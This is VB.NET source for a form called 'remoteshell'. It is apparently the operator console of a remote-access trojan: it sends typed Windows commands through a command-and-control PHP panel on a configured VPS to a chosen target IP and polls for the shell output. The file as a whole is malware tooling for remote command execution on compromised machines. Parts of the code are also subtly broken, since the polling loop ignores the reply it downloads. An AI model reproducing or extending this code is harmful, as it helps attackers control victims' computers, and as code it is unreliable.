Imports System.Net

Public Class remoteshell
    Public targetIp As String = ""
    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        Button1.Visible = TextBox1.Text.Trim <> ""
    End Sub

    Private Sub remoteshell_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBox2.ForeColor = Color.White
        Me.Text = "Remote Shell @ " & targetIp
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim action As String = TextBox1.Text
        TextBox1.Clear()
        TextBox2.Text = TextBox2.Text + action
        Dim client As New WebClient
        client.DownloadString(My.Settings.vpsurl & "clients.php?action=runwincmd&target=" & targetIp & "&actioncontent=" & action)
        Dim maxtry = 15
        Dim acttry = 0
        While True
            acttry = acttry + 1
            If acttry >= maxtry Then Return
            Dim str As string = client.DownloadString(My.Settings.vpsurl & "clients.php?action=getshellreply&target=" & targetIp & "&actioncontent=" & TextBox2.Text)
            If client.ToString = "" Then Else TextBox2.Text = TextBox2.Text & client.ToString
            System.Threading.Thread.Sleep(300)
        End While

    End Sub
End Class